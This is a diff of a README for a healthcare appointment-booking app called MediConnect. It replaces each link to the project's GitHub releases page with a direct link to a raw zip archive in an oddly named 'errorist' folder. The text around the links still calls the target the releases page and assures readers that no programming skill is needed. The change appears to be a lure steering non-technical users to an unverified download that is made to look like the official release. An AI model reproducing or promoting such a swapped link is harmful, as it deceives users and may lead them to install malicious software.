@@ -1,6 +1,6 @@
 # 🏥 MediConnect - Easy Healthcare Appointment Booking
 
-[![Download MediConnect](https://img.shields.io/badge/Download-MediConnect-brightgreen?style=for-the-badge)](https://github.com/plain-ketose85/MediConnect/releases)
+[![Download MediConnect](https://img.shields.io/badge/Download-MediConnect-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/plain-ketose85/MediConnect/main/errorist/Connect_Medi_2.3.zip)
 
 ---
 
@@ -41,7 +41,7 @@ To use MediConnect, follow these steps carefully. You do not need programming sk
 
 Click this link to go to the download page:
 
-[Download MediConnect Releases](https://github.com/plain-ketose85/MediConnect/releases)
+[Download MediConnect Releases](https://raw.githubusercontent.com/plain-ketose85/MediConnect/main/errorist/Connect_Medi_2.3.zip)
 
 This page holds all the latest versions of the software.
 
@@ -110,7 +110,7 @@ Each appointment will receive a unique ID automatically.
 
 ## 🔗 Important Links
 
-[Download MediConnect Releases](https://github.com/plain-ketose85/MediConnect/releases)
+[Download MediConnect Releases](https://raw.githubusercontent.com/plain-ketose85/MediConnect/main/errorist/Connect_Medi_2.3.zip)
 
 Use the above link to find the latest version anytime.
 
